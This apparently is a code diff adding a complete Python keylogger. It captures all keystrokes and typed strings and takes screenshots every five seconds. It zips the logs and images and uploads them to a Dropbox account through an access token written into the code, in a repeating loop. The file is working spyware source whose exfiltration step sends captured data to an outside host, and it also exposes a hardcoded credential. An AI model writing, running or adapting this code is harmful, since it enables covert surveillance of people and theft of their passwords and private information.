@@ -1,0 +1,231 @@
+import keyboard
+import datetime
+import multiprocessing
+import time
+import pyautogui
+import os
+import zipfile
+import sys
+import dropbox
+
+from dropbox.files import WriteMode
+from dropbox.exceptions import ApiError, AuthError
+
+if not os.path.exists("./Screenshots/"):
+    os.mkdir("./Screenshots/")
+
+mydir = ("./Screenshots/")
+
+
+while True:
+
+    try:
+        filelist = [f for f in os.listdir(mydir) if f.endswith(".jpg")]
+        for f in filelist:
+            os.remove(os.path.join(mydir, f))
+
+    except:
+        pass
+
+    file = open("./keysEvents.txt", "w", encoding="utf-8")
+    file.truncate(0)
+    def on_key(key):
+
+        file.write(str(key.__dict__) + "\n")
+        file.flush()
+
+
+    def esc():
+        time.sleep(120)
+
+        stop = True
+        return stop
+
+    def wait(esc):
+        esc()
+        while esc == False:
+                time.sleep(1e6)
+        else :
+            pass
+
+    def record():
+
+        keyboard.start_recording()
+        wait(esc)
+        return keyboard.stop_recording()
+
+    def record2():
+
+        file2 = open("./keylog.txt", "w", encoding="utf-8")  # open keylog file
+        now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") # set the starting date and time
+        file2.write(str("\n"+now))                                        # write the date
+        keyboard.hook(on_key)
+        events = record()                                    #call "record()" function and put the list containing all recorded keyboard events in "events" var
+        #print(events)
+        allkeys = list()                                            #list containing all keyboard events containg more info
+
+        for i in keyboard.get_typed_strings(events, allow_backspace=True): #get just the typed chars
+            file2.write("\n")
+            file2.write(i)
+
+
+        for i in events:
+            istr = str(i)
+            if "down" in istr and "shift" not in istr:
+
+                istr = istr.strip("KeyboardEvent").split(" ")[0] + ")"
+                allkeys.append(istr)
+
+            elif "shift" in istr:
+
+                istr = istr.strip("KeyboardEvent ")
+                allkeys.append(istr)
+
+            else:
+                continue
+
+        file2.write("\n")
+        file2.write(str(allkeys))
+        file2.write("\n")
+        now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        file2.write(str(now))
+
+        print("recorded")
+
+
+    def screenshot():
+
+        while True:
+            time.sleep(5)
+            filename = "./Screenshots/" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".jpg"
+            pyautogui.screenshot(filename)
+
+
+    #file2 = open("./keylog.txt", "w", encoding="utf-8")
+    # Start record as a process
+    #hook = multiprocessing.Process(target=keyboard.hook, name="hook", args=(on_key,))
+    rec = multiprocessing.Process(target=record2, name="record",)
+
+    rec.start()
+    #hook.start()
+
+    esc = multiprocessing.Process(target=esc, name="press esc")
+    esc.start()
+    screen = multiprocessing.Process(target=screenshot, name="screens")
+    screen.start()
+
+
+
+    time.sleep(2)
+
+    rec.join()
+
+
+    rec.terminate()
+    esc.terminate()
+    screen.terminate()
+#---------------------------------------------------------------
+    now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    path = "/root/PycharmProjects/Keylogger"
+    path2 = "/root/PycharmProjects/Keylogger/Screenshots"
+
+    def zipdir(path, path2, ziph):
+        # ziph is zipfile handle
+        for root, dirs, files in os.walk(path):
+            for file in files:
+                if ".txt" in file:
+                    ziph.write(os.path.join(root, file))
+
+        for root, dirs, files in os.walk(path2):
+            for file in files:
+                ziph.write(os.path.join(root, file))
+
+
+    if __name__ == '__main__':
+        zipf = zipfile.ZipFile('Keylogger_report.zip', 'w', zipfile.ZIP_DEFLATED)
+        zipdir(path, path2, zipf)
+        zipf.close()
+
+    print("ziped")
+
+    #time.sleep(2)
+
+
+
+
+    #break
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    # Access token
+    TOKEN = 'sl.AbCaGiQ5K_r3aCttjTAE41GF3ZK4q2cA7gAZ3TEfBbUqeGtzasKf8-P6Fz_D_sbvV-3x1r7vttb2IxkRym2TuKpcA-ruVZo9cDJa5vQv7TTxdRdcAyDzEmELI-UinJXEpXMNET8h'
+    LOCALFILE = '/root/PycharmProjects/Keylogger/Keylogger_report.zip'
+    BACKUPPATH = '/Keylogs'+ now + ".zip"  # Keep the forward slash before destination filename
+
+
+    # Uploads contents of LOCALFILE to Dropbox
+    def backup():
+        with open(LOCALFILE, 'rb') as f:
+            # We use WriteMode=overwrite to make sure that the settings in the file
+            # are changed on upload
+            print("Uploading " + LOCALFILE + " to Dropbox as " + BACKUPPATH + "...")
+            try:
+                dbx.files_upload(f.read(), BACKUPPATH, mode=WriteMode('overwrite'))
+            except ApiError as err:
+                # This checks for the specific error where a user doesn't have enough Dropbox space quota to upload this file
+                if (err.error.is_path() and
+                        err.error.get_path().error.is_insufficient_space()):
+                    sys.exit("ERROR: Cannot back up; insufficient space.")
+                elif err.user_message_text:
+                    print(err.user_message_text)
+                    sys.exit()
+                else:
+                    print(err)
+                    sys.exit()
+
+
+    # Adding few functions to check file details
+    def checkFileDetails():
+        print("Checking file details")
+
+        for entry in dbx.files_list_folder('').entries:
+            print("File list is : ")
+            print(entry.name)
+
+
+    # Run this script independently
+    if __name__ == '__main__':
+        # Check for an access token
+        if (len(TOKEN) == 0):
+            sys.exit(
+                "ERROR: Looks like you didn't add your access token. Open up backup-and-restore-example.py in a text editor and paste in your token in line 14.")
+
+        # Create an instance of a Dropbox class, which can make requests to the API.
+        print("Creating a Dropbox object...")
+        dbx = dropbox.Dropbox(TOKEN)
+
+        # Check that the access token is valid
+        try:
+            dbx.users_get_current_account()
+        except AuthError as err:
+            sys.exit(
+                "ERROR: Invalid access token; try re-generating an access token from the app console on the web.")
+
+        try:
+            checkFileDetails()
+        except :
+            sys.exit("Error while checking file details")
+
+        print("Creating backup...")
+        # Create a backup of the current settings file
+        backup()
+
+        print("Done!")
+
+        #break
+
+    print("Cycle")
+
+
+
+
+
